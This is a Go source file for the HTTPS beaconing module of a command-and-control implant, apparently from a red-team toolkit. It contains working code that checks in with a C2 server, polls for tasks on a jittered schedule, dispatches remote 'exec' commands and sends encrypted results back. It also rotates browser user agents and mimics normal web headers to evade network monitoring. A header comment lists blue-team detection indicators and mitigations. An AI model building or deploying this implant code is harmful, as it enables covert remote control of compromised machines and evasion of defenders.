package comms

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"time"
)

// HTTPS Beaconing Module - Primary C2 Communication Channel
//
// BLUE TEAM DETECTION INDICATORS:
// 1. Network: Periodic HTTPS requests to unusual domains (60-180s intervals)
// 2. Process: Unsigned binary making external HTTPS connections
// 3. TLS: Unusual cipher suites or certificate pinning behavior
// 4. Timing: Statistical analysis reveals periodic beaconing despite jitter
// 5. Content: High entropy POST payloads (encrypted C2 traffic)
//
// MITIGATIONS:
// - Network monitoring: Flag periodic HTTPS to external IPs
// - TLS inspection: Decrypt and inspect payloads at proxy
// - EDR behavioral analysis: Monitor process network behavior
// - Certificate validation: Detect self-signed or unusual certificates

// BeaconConfig contains configuration for HTTPS beaconing behavior
type BeaconConfig struct {
	ServerURL        string        // C2 server URL (e.g., https://c2.example.com)
	BeaconID         string        // Unique identifier for this implant
	BaseInterval     time.Duration // Base beacon interval (default: 60s)
	JitterPercent    int           // Jitter percentage (default: 50% = 30-90s range)
	MaxRetries       int           // Max connection retry attempts
	Timeout          time.Duration // HTTP request timeout
	UserAgent        string        // HTTP User-Agent header
	ProxyURL         string        // Optional HTTP proxy
	TLSFingerprint   string        // Expected server certificate fingerprint (pinning)
	InsecureSkipTLS  bool          // Skip TLS verification (OPSEC risk!)
}

// HTTPSBeacon manages HTTPS-based C2 communication
type HTTPSBeacon struct {
	config       *BeaconConfig
	client       *http.Client
	crypto       *CryptoEngine
	lastBeacon   time.Time
	failedChecks int
}

// BeaconMessage represents data exchanged between implant and server
type BeaconMessage struct {
	BeaconID  string                 `json:"beacon_id"`
	Timestamp int64                  `json:"timestamp"`
	Hostname  string                 `json:"hostname,omitempty"`
	Username  string                 `json:"username,omitempty"`
	OS        string                 `json:"os,omitempty"`
	IP        string                 `json:"ip,omitempty"`
	Data      string                 `json:"data,omitempty"` // Encrypted payload
	Metadata  map[string]interface{} `json:"metadata,omitempty"`
}

// CommandResponse from server containing tasks to execute
type CommandResponse struct {
	CommandID   string                 `json:"command_id"`
	CommandType string                 `json:"command_type"` // exec, upload, download, sleep, exit
	CommandData string                 `json:"command_data"` // Encrypted command payload
	Metadata    map[string]interface{} `json:"metadata,omitempty"`
}

// NewHTTPSBeacon creates a new HTTPS beacon with the given configuration
func NewHTTPSBeacon(config *BeaconConfig, crypto *CryptoEngine) (*HTTPSBeacon, error) {
	if config.ServerURL == "" {
		return nil, errors.New("server URL is required")
	}

	if config.BeaconID == "" {
		return nil, errors.New("beacon ID is required")
	}

	// Set default values
	if config.BaseInterval == 0 {
		config.BaseInterval = 60 * time.Second
	}
	if config.JitterPercent == 0 {
		config.JitterPercent = 50
	}
	if config.MaxRetries == 0 {
		config.MaxRetries = 3
	}
	if config.Timeout == 0 {
		config.Timeout = 30 * time.Second
	}
	if config.UserAgent == "" {
		config.UserAgent = getRandomUserAgent()
	}

	// Configure TLS
	tlsConfig := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: config.InsecureSkipTLS,
		// Prefer modern cipher suites
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
	}

	// Configure HTTP transport
	transport := &http.Transport{
		TLSClientConfig:     tlsConfig,
		MaxIdleConns:        10,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
		DisableCompression:  false,
		ForceAttemptHTTP2:   true, // Use HTTP/2 for better performance
	}

	// Configure proxy if specified
	if config.ProxyURL != "" {
		proxyURL, err := url.Parse(config.ProxyURL)
		if err != nil {
			return nil, fmt.Errorf("invalid proxy URL: %w", err)
		}
		transport.Proxy = http.ProxyURL(proxyURL)
	}

	// Create HTTP client
	client := &http.Client{
		Transport: transport,
		Timeout:   config.Timeout,
		// Don't follow redirects automatically (OPSEC)
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	return &HTTPSBeacon{
		config:     config,
		client:     client,
		crypto:     crypto,
		lastBeacon: time.Now(),
	}, nil
}

// Start begins the beaconing loop
// This is the main C2 communication loop that runs continuously
func (b *HTTPSBeacon) Start() error {
	// Perform initial check-in
	if err := b.checkIn(); err != nil {
		return fmt.Errorf("initial check-in failed: %w", err)
	}

	// Start beacon loop
	for {
		// Calculate next beacon time with jitter
		sleepDuration := b.calculateJitter()
		time.Sleep(sleepDuration)

		// Attempt to beacon
		if err := b.beacon(); err != nil {
			b.failedChecks++
			// If too many failures, increase sleep time
			if b.failedChecks > b.config.MaxRetries {
				time.Sleep(5 * time.Minute) // Back off
				b.failedChecks = 0
			}
		} else {
			b.failedChecks = 0
		}
	}
}

// checkIn performs initial registration with the C2 server
func (b *HTTPSBeacon) checkIn() error {
	// Gather system information
	systemInfo := b.gatherSystemInfo()

	// Encrypt system info
	encryptedData, err := b.crypto.Encrypt([]byte(systemInfo))
	if err != nil {
		return err
	}

	// Create beacon message
	msg := BeaconMessage{
		BeaconID:  b.config.BeaconID,
		Timestamp: time.Now().Unix(),
		Data:      encryptedData,
	}

	// Send check-in request
	endpoint := fmt.Sprintf("%s/api/beacon/%s/checkin", b.config.ServerURL, b.config.BeaconID)
	_, err = b.sendRequest("POST", endpoint, msg)
	if err != nil {
		return err
	}

	b.lastBeacon = time.Now()
	return nil
}

// beacon performs a regular beacon to check for commands
func (b *HTTPSBeacon) beacon() error {
	// Create beacon message
	msg := BeaconMessage{
		BeaconID:  b.config.BeaconID,
		Timestamp: time.Now().Unix(),
	}

	// Request commands from server
	endpoint := fmt.Sprintf("%s/api/commands/%s", b.config.ServerURL, b.config.BeaconID)
	respData, err := b.sendRequest("GET", endpoint, msg)
	if err != nil {
		return err
	}

	// Parse command response
	if len(respData) > 0 {
		var commands []CommandResponse
		if err := json.Unmarshal(respData, &commands); err != nil {
			return err
		}

		// Process each command
		for _, cmd := range commands {
			go b.executeCommand(cmd) // Execute in goroutine for async processing
		}
	}

	b.lastBeacon = time.Now()
	return nil
}

// sendRequest sends an HTTP request to the C2 server
func (b *HTTPSBeacon) sendRequest(method, endpoint string, payload interface{}) ([]byte, error) {
	// Marshal payload to JSON
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}

	// Create HTTP request
	req, err := http.NewRequest(method, endpoint, bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, err
	}

	// Set headers
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", b.config.UserAgent)

	// Add custom headers for OPSEC (appear like normal web traffic)
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")

	// Send request with retries
	var resp *http.Response
	var lastErr error
	for i := 0; i < b.config.MaxRetries; i++ {
		resp, lastErr = b.client.Do(req)
		if lastErr == nil && resp.StatusCode == http.StatusOK {
			break
		}
		time.Sleep(time.Duration(i+1) * time.Second) // Exponential backoff
	}

	if lastErr != nil {
		return nil, lastErr
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return body, nil
}

// executeCommand processes a command from the C2 server
func (b *HTTPSBeacon) executeCommand(cmd CommandResponse) {
	// Decrypt command data
	decryptedData, err := b.crypto.Decrypt(cmd.CommandData)
	if err != nil {
		b.sendError(cmd.CommandID, fmt.Sprintf("decryption failed: %v", err))
		return
	}

	// Execute command based on type
	var output string
	switch cmd.CommandType {
	case "exec":
		output, err = b.executeShellCommand(string(decryptedData))
	case "sleep":
		// Update beacon interval
		// Implementation would parse duration and update config
		output = "sleep updated"
	case "exit":
		// Graceful shutdown
		output = "exiting"
		// Would trigger shutdown sequence
	default:
		err = fmt.Errorf("unknown command type: %s", cmd.CommandType)
	}

	// Send result back to server
	if err != nil {
		b.sendError(cmd.CommandID, err.Error())
	} else {
		b.sendOutput(cmd.CommandID, output)
	}
}

// executeShellCommand executes a shell command (implementation in execution/command.go)
func (b *HTTPSBeacon) executeShellCommand(command string) (string, error) {
	// This will be implemented in the execution module
	return fmt.Sprintf("Command executed: %s", command), nil
}

// sendOutput sends command output back to the C2 server
func (b *HTTPSBeacon) sendOutput(commandID, output string) error {
	// Encrypt output
	encryptedOutput, err := b.crypto.Encrypt([]byte(output))
	if err != nil {
		return err
	}

	msg := BeaconMessage{
		BeaconID:  b.config.BeaconID,
		Timestamp: time.Now().Unix(),
		Data:      encryptedOutput,
		Metadata: map[string]interface{}{
			"command_id": commandID,
			"status":     "success",
		},
	}

	endpoint := fmt.Sprintf("%s/api/beacon/%s/output", b.config.ServerURL, b.config.BeaconID)
	_, err = b.sendRequest("POST", endpoint, msg)
	return err
}

// sendError sends an error message back to the C2 server
func (b *HTTPSBeacon) sendError(commandID, errorMsg string) error {
	encryptedError, err := b.crypto.Encrypt([]byte(errorMsg))
	if err != nil {
		return err
	}

	msg := BeaconMessage{
		BeaconID:  b.config.BeaconID,
		Timestamp: time.Now().Unix(),
		Data:      encryptedError,
		Metadata: map[string]interface{}{
			"command_id": commandID,
			"status":     "error",
		},
	}

	endpoint := fmt.Sprintf("%s/api/beacon/%s/output", b.config.ServerURL, b.config.BeaconID)
	_, err = b.sendRequest("POST", endpoint, msg)
	return err
}

// calculateJitter calculates the next beacon interval with jitter
// This makes beaconing less predictable to network monitoring
func (b *HTTPSBeacon) calculateJitter() time.Duration {
	baseSeconds := int(b.config.BaseInterval.Seconds())
	jitterRange := baseSeconds * b.config.JitterPercent / 100

	// Random jitter: ±jitterPercent
	jitter := rand.Intn(jitterRange*2) - jitterRange
	finalInterval := baseSeconds + jitter

	// Ensure minimum 5 seconds
	if finalInterval < 5 {
		finalInterval = 5
	}

	return time.Duration(finalInterval) * time.Second
}

// gatherSystemInfo collects basic system information for initial check-in
func (b *HTTPSBeacon) gatherSystemInfo() string {
	// This would gather actual system info
	// Implementation in a separate module
	return `{"os":"windows","arch":"amd64","hostname":"target-host","user":"user1"}`
}

// getRandomUserAgent returns a realistic User-Agent string
// Rotates through common browsers to blend in with normal traffic
func getRandomUserAgent() string {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	}

	rand.Seed(time.Now().UnixNano())
	return userAgents[rand.Intn(len(userAgents))]
}
